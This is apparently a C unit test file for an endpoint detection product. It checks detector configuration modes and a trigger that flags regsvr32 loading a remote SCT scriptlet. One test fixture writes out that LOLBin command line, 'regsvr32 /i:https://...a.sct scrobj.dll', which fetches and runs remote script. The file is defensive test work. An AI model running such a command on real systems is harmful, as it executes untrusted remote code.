#include "edr/detection_profile.h"
#include "edr/detection_trigger.h"

#include <stdio.h>
#include <string.h>

static int g_failures;

static void expect_true(int cond, const char *msg) {
  if (!cond) {
    fprintf(stderr, "FAIL: %s\n", msg);
    g_failures++;
  }
}

static void base_config(EdrConfig *cfg) {
  memset(cfg, 0, sizeof(*cfg));
  cfg->detection.auto_profile = true;
  cfg->detection.shellcode_mode = 0;
  cfg->detection.webshell_mode = 0;
  cfg->detection.pmfe_mode = 0;
  cfg->attack_surface.enabled = false;
}

static void test_profile_forced_modes(void) {
  EdrConfig cfg;
  base_config(&cfg);
  cfg.detection.shellcode_mode = 1;
  cfg.detection.webshell_mode = 1;
  cfg.detection.pmfe_mode = 2;
  edr_detection_apply_profile(&cfg);
  expect_true(cfg.shellcode_detector.enabled, "shellcode_mode=1 enables shellcode detector");
  expect_true(cfg.webshell_detector.enabled, "webshell_mode=1 enables webshell detector");
  expect_true(cfg.pmfe.idle_scan_enabled, "pmfe_mode=2 enables idle PMFE scan");

  cfg.detection.shellcode_mode = 0;
  cfg.detection.webshell_mode = 0;
  cfg.detection.pmfe_mode = 0;
  edr_detection_apply_profile(&cfg);
  expect_true(!cfg.shellcode_detector.enabled, "shellcode_mode=0 disables shellcode detector");
  expect_true(!cfg.webshell_detector.enabled, "webshell_mode=0 disables webshell detector");
  expect_true(!cfg.pmfe.idle_scan_enabled, "pmfe_mode=0 disables idle PMFE scan");
}

static void test_trigger_regsvr32_remote_sct(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_PROCESS_CREATE;
  slot.priority = 0;
  br.type = EDR_EVENT_PROCESS_CREATE;
  br.pid = 4321;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "regsvr32.exe");
  snprintf(br.cmdline, sizeof(br.cmdline), "%s",
           "regsvr32.exe /s /n /u /i:https://example.test/a.sct scrobj.dll");

  expect_true(edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "regsvr32 remote SCT should produce a detection decision");
  expect_true(dec.recommend_pmfe, "regsvr32 remote SCT should recommend PMFE");
  expect_true(dec.pmfe_pid == 4321, "PMFE target should be the regsvr32 PID");
  expect_true(strcmp(dec.pmfe_reason, "lolbin_remote_payload") == 0,
              "PMFE reason should identify LOLBin remote payload");
  expect_true(!dec.recommend_minidump, "P0 trigger must not auto-recommend minidump");
}

static void test_trigger_ordinary_file_event_skips_pmfe(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_FILE_CREATE;
  slot.priority = 1;
  br.type = EDR_EVENT_FILE_CREATE;
  br.pid = 2000;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "notepad.exe");
  snprintf(br.file_path, sizeof(br.file_path), "%s", "C:\\Temp\\sample.txt");

  expect_true(!edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "ordinary file event should not trigger PMFE");
  expect_true(!dec.recommend_pmfe, "ordinary file event should not recommend PMFE");
}

static void test_trigger_requires_exact_process_basename(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_PROCESS_CREATE;
  slot.priority = 0;
  br.type = EDR_EVENT_PROCESS_CREATE;
  br.pid = 5333;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "myregsvr32.exe");
  snprintf(br.cmdline, sizeof(br.cmdline), "%s", "myregsvr32.exe https://example.test/a.sct scrobj.dll");

  expect_true(!edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "lookalike process names must not match LOLBin triggers");
  expect_true(!dec.recommend_pmfe, "lookalike process name should not recommend PMFE");
}

int main(void) {
  test_profile_forced_modes();
  test_trigger_regsvr32_remote_sct();
  test_trigger_ordinary_file_event_skips_pmfe();
  test_trigger_requires_exact_process_basename();
  return g_failures == 0 ? 0 : 1;
}
